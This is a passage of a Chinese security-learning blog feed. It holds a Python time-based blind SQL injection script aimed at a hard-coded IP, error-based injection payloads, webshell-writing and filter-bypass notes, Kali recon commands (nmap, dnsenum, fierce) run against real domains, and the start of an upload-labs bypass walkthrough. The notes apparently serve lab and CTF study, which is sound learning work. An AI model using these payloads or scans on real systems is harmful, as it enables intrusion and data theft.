class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dbname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">zidian=<span class="string">&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">    url=<span class="string">&quot;http://222.18.158.254:4610/?id=1 and if(ascii(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,benchmark(1e5,md5(1)),1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j),i)</span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a.elapsed.total_seconds()&gt;=<span class="number">1.5</span>):</span><br><span class="line">      <span class="built_in">print</span> url</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;succeess&quot;</span></span><br><span class="line">      dbname = dbname+i</span><br><span class="line">      <span class="built_in">print</span> dbname</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> dbname</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul><li>原理：利用数据库的报错机制，人为的制造错误信息并将信息显示到系统提示的错误中</li></ul><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><ul><li>模板</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(查询语句,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure><ul><li>获取数据库</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure><ul><li>获取数据表<ul><li>控制imit可获取其他表名</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1, concat(0x25, (查询语句)))</span><br></pre></td></tr></table></figure><ul><li>获取数据库名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> database() <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><ul><li>获取数据库表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)))</span><br><span class="line">控制limit得到其他表</span><br></pre></td></tr></table></figure><ul><li>获取数据库表的字段名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><ul><li>获取字段值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> 字段名 <span class="keyword">from</span> 数据库名.表名  limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>模板</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(查询语句),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure><ul><li>获得数据库</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database() <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure><p>获取数据库表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure><p>获取表的字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> ),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure><p>获取字段值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(id) <span class="keyword">from</span> flag ),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure><p>此外还有二次注入，堆叠注入等</p><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><ul><li>select into outfile<ul><li>前提：需知道物理路径 ,secure_file_priv = on<ul><li>@@basedir</li><li>phpinfo()</li></ul></li></ul></li><li>phpmyadmin：日志漏洞<ul><li>general log</li><li>general log file</li></ul></li></ul><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ul><li>双写绕过</li><li>大小写绕过</li><li>内联注释</li><li>|| &amp;&amp; 绕过and or</li><li>编码绕过<ul><li>hex编码</li><li>ascii编码</li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;….&lt;/p&gt;</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>kali下的信息收集工具学习</title>
    <link href="http://example.com/2019/07/08/kali%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2019/07/08/kali%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2019-07-07T16:00:00.000Z</published>
    <updated>2021-10-25T05:12:34.515Z</updated>
    
    <content type="html"><![CDATA[<p>-</p><span id="more"></span><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap是一款端口扫描神器。</p><p>列举常用的几种用法</p><p><strong>常用指令</strong></p><ul><li>nmap -sP IP //查看一个主机是否在线</li><li>nmap IP //查看一个主机上开放的端口</li><li>nmap -sV -O IP //判断目标操作系统类型</li><li>nmap -sS IP //半开放syn扫描</li><li>nmap -p 1-1000 IP //扫描指定端口范围</li><li>nmap -p 80 IP //扫描特定端口</li><li>nmap -sV IP //查看目标开放端口对应的协议及版本信息</li></ul><p><strong>三个判断防火墙的扫描</strong></p><ul><li>nmap -sF IP</li><li>nmap -sA IP</li><li>nmap -sW IP //ACK,探测防火墙扫描</li></ul><p><strong>其他参数</strong></p><ul><li>-sT 全连接扫描，更慢，会被服务器记录日志，但不易被入侵检测系统检测到</li><li>-Pn 跳过Ping测试(防火墙)，扫描指定目标</li><li>-v 详细模式V越多就越详细</li><li>-p 80 ping指定端口</li><li>–script=script_name 使用脚本</li></ul><p>脚本列表<a href="http://nmap.org/nsedoc/scripts/">http://nmap.org/nsedoc/scripts/</a></p><p><strong>脚本使用实例：</strong></p><ul><li>nmap –script=auth IP //负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</li><li>http-php-version //获得PHP版本信息</li><li>Http-enum //枚举Web站点目录</li><li>smtp-strangeport //判断SMTP是否运行在默认端口</li><li>dns-blacklist //发现IP地址黑名单</li><li>nmap –script=vuln 192.168.137.* //扫描常见漏洞</li><li>smb-check-vulns //检测smb漏洞</li><li>samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞</li></ul><p>测试WAF是否存在</p><ul><li>nmap -p 80,443 –script=http-waf-detect 192.168.0.100</li><li>nmap -p 80,443 –script=http-waf-fingerprint <a href="http://www.victom.com/">www.victom.com</a></li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>扫描自己网段下的C段网络</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image002.png" alt="img"></p><p>选取一个ip进行信息收集，查看哪些端口处于开放</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image004.png" alt="img"></p><p>查看80端口是否开放</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image006.png" alt="img"></p><p>等等等</p><h2 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h2><p>DMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息：</p><ul><li>根据IP（或域名）来查询目标主机的Whois信息</li><li>在Netcraft.com的网站上挖掘主机信息</li><li>查找目标域中用的子域</li><li>查找目标域的电子邮件地址</li><li>探测目标主机上打开的端口、被屏蔽的端口和关闭的端口</li></ul><p><strong>参数</strong></p><p>dmtry -h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> -o    //将输出保存到％host.txt或由-o文件指定的文件</span><br><span class="line"></span><br><span class="line"> -i   //对主机的IP地址执行whois查找</span><br><span class="line"></span><br><span class="line"> -w   //对主机的域名执行whois查找</span><br><span class="line"></span><br><span class="line"> -n  //在主机上检索Netcraft.com信息</span><br><span class="line"></span><br><span class="line"> -s   //执行搜索可能的子域</span><br><span class="line"></span><br><span class="line"> -e   //执行搜索可能的电子邮件地址</span><br><span class="line"></span><br><span class="line"> -p  //在主机上执行TCP端口扫描</span><br><span class="line"></span><br><span class="line">\* -f   //在显示输出报告过滤端口的主机上执行TCP端口扫描</span><br><span class="line"></span><br><span class="line">\* -b   //读取从扫描端口接收的banner</span><br><span class="line"></span><br><span class="line">\* -t 0-9 //0-9扫描TCP端口时设置TTL（默认为2）</span><br><span class="line"></span><br><span class="line">*Requires the -p flagged to be passed //*标记的指令需要-p标记才能传递</span><br></pre></td></tr></table></figure><h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -p baidu.com -f -b</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image008.png" alt="img"></p><h2 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h2><p>fierce是RSnake创立的快速有效地DNS暴力破解工具。<strong>fierce工具首先根据域名的IP地址，查询相关的域名服务器，然后利用字典进行攻击</strong></p><p>查看参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">fierce -h</span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">-connect [header.txt]     对非RFC1918地址进行HTTP连接（耗时长、流量大），默认返回服务器的响应头部。可通过文件指定HTTP请求头的Host信息，如：fierce -dns example.com -connect headers.txt</span><br><span class="line"></span><br><span class="line">-delay        指定两次查询之间的时间间隔</span><br><span class="line"></span><br><span class="line">-dns         指定查询的域名</span><br><span class="line"></span><br><span class="line">-dnsfile &lt;dnsfile.txt&gt;     用文件指定反向查询的DNS服务器列表</span><br><span class="line"></span><br><span class="line">-dnsserver  指定用来初始化SOA查询的DNS服务器。（仅用于出初始化，后续查询将使用目标的DNS服务器）</span><br><span class="line"></span><br><span class="line">-file &lt;domain.txt&gt;       将结果输出至文件</span><br><span class="line"></span><br><span class="line">-fulloutput             与-connect结合，输出服务器返回的所有信息</span><br><span class="line"></span><br><span class="line">-help                 打印帮助信息</span><br><span class="line"></span><br><span class="line">-nopattern            不适用搜索模式查找主机。（此参数暂时没有用明白）</span><br><span class="line"></span><br><span class="line">-range &lt;1.1.1.1/24&gt;     对内部IP范围做IP反查(此参数尚未用明白)。必须与dnsserver参数配合，指定内部DNS服务器，如： fierce -range 111.222.333.0-255 -dnsserver ns1.example.com</span><br><span class="line"></span><br><span class="line">-search       指定其他的域，在其他的域内进行查找（此参数没有用明白），如：  fierce -dns examplecompany.com -search corpcompany,blahcompany</span><br><span class="line"></span><br><span class="line">-tcptimeout    指定查询的超时时间</span><br><span class="line"></span><br><span class="line">-threads [number]      指定扫描的线程数，默认单线程</span><br><span class="line"></span><br><span class="line">-traverse [number]      指定扫描的上下IP范围，默认扫描上下5各个。</span><br><span class="line"></span><br><span class="line">-version              打印fierce版本</span><br><span class="line"></span><br><span class="line">-wide                扫描入口IP地址的C段。产生大流量、会收集到更多信息.</span><br><span class="line"></span><br><span class="line">-wordlist &lt;sub.txt&gt;     使用指定的字典进行子域名爆破</span><br></pre></td></tr></table></figure><h3 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h3><p>枚举文件内的子域名进行爆破，线程数为3，如果要输出到文件保存，则可在后面加上-file test.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fierce -dns baidu.com -wordlist dns.txt -threads 3</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image010.png" alt="img"></p><h2 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h2><p>它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p><p><strong>参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">dnsenum -h</span><br><span class="line">--dnsserver  &lt;server&gt;</span><br><span class="line"></span><br><span class="line">      　　//指定一个DNS服务器查询A, NS and　MX记录</span><br><span class="line"></span><br><span class="line"> --enum    //等同于--threads 5 -s 15 -w</span><br><span class="line"></span><br><span class="line"> -h, --help   //显示帮助信息</span><br><span class="line"></span><br><span class="line"> --noreverse  //跳过反向查询</span><br><span class="line"></span><br><span class="line"> --nocolor  　//禁止ADSIColor输出</span><br><span class="line"></span><br><span class="line"> --private   //在文件domain_ips.txt的末尾显示并保存私有密码</span><br><span class="line"></span><br><span class="line"> --subfile &lt;file&gt; //将所有有效子域写入此文件</span><br><span class="line"></span><br><span class="line"> -t, --timeout &lt;value&gt;  //设置tcp和udp超时值</span><br><span class="line"></span><br><span class="line"> --threads &lt;value&gt; 　//设置线程数</span><br><span class="line"></span><br><span class="line"> -v, --verbose  //显示所有进度和所有错误消息.</span><br><span class="line"></span><br><span class="line">GOOGLE SCRAPING OPTIONS: </span><br><span class="line"></span><br><span class="line"> -p, --pages &lt;value&gt;   //抓取名称时要处理的google搜索页面的数量，默认为5页，必须指定-s开关。</span><br><span class="line"></span><br><span class="line"> -s, --scrap &lt;value&gt; //要从Google中删除的子域的最大数量</span><br><span class="line"></span><br><span class="line">BRUTE FORCE OPTIONS:</span><br><span class="line"></span><br><span class="line"> -f, --file &lt;file&gt; 　//从此文件读取子域执行暴力枚举　</span><br><span class="line"></span><br><span class="line"> -u, --update &lt;a|g|r|z&gt;     //使用有效的子域更新,使用-f指定文件。</span><br><span class="line"></span><br><span class="line">  a (all)   //使用所有结果更新。</span><br><span class="line"></span><br><span class="line">  g    //仅使用Google抓取结果更新</span><br><span class="line"></span><br><span class="line">  r    //仅使用反向查找结果进行更新。</span><br><span class="line"></span><br><span class="line">  z     //仅使用区域转移结果进行更新</span><br><span class="line"></span><br><span class="line"> -r, --recursion  //允许使用递归查询</span><br><span class="line"></span><br><span class="line">WHOIS NETRANGE OPTIONS:</span><br><span class="line"></span><br><span class="line"> -d, --delay &lt;value&gt;  //在whois查询之间等待的最大秒数，随机定义为3秒。</span><br><span class="line"></span><br><span class="line"> -w, --whois    //对c类网络范围执行whois查询</span><br><span class="line"></span><br><span class="line">      // **警告**：这可以产生非常大的netranges，花费大量的时间来执行反向查找。</span><br><span class="line"></span><br><span class="line">REVERSE LOOKUP OPTIONS:</span><br><span class="line"></span><br><span class="line"> -e, --exclude &lt;regexp&gt;　　//从反向查找结果中排除匹配正则表达式表达式的PTR记录，这对无效主机名有用。</span><br><span class="line"></span><br><span class="line">OUTPUT OPTIONS:</span><br><span class="line"></span><br><span class="line"> -o --output &lt;file&gt;  　　//以XML保存输出结果</span><br></pre></td></tr></table></figure><h3 id="实践-3"><a href="#实践-3" class="headerlink" title="实践"></a>实践</h3><p>枚举dns中的子域名进行暴力破解，并将有效子域名写入文件，线程设置为2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum -f dns.txt cuit.edu.cn -threads 2 --subfile cuit.txt</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image014.png" alt="img"></p><p><strong><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/clip_image016.png" alt="img"></strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;-&lt;/p&gt;</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs靶场WP</title>
    <link href="http://example.com/2019/06/30/upload-labs/"/>
    <id>http://example.com/2019/06/30/upload-labs/</id>
    <published>2019-06-29T16:00:00.000Z</published>
    <updated>2021-10-25T05:13:47.123Z</updated>
    
    <content type="html"><![CDATA[<p>靶场github：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>照着大佬的思维导图学习<span id="more"></span></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/mind-map.png" alt="上传漏洞分类"></p><h2 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h2><ul><li>代码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>分析：</p><ul><li>JavaScript代码进行前端检测对文件的上传后缀名进行了限制</li></ul></li><li><p>绕过思路</p><ul><li>抓包</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625171949327.png" alt="image-20200625171949327"></p></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625172038453.png" alt="image-20200625172038453"></p><h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>分析</p><ul><li>后端php代码对文件的type进行了校验，仅允许上传image/jpeg类型</li></ul></li><li><p>绕过</p><ul><li>上传shell.php，抓包改type</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625172748937.png" alt="image-20200625172748937"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625172634693.png" alt="image-20200625172634693"></p></li></ul><h2 id="pass-03"><a href="#pass-03" class="headerlink" title="pass -03"></a>pass -03</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 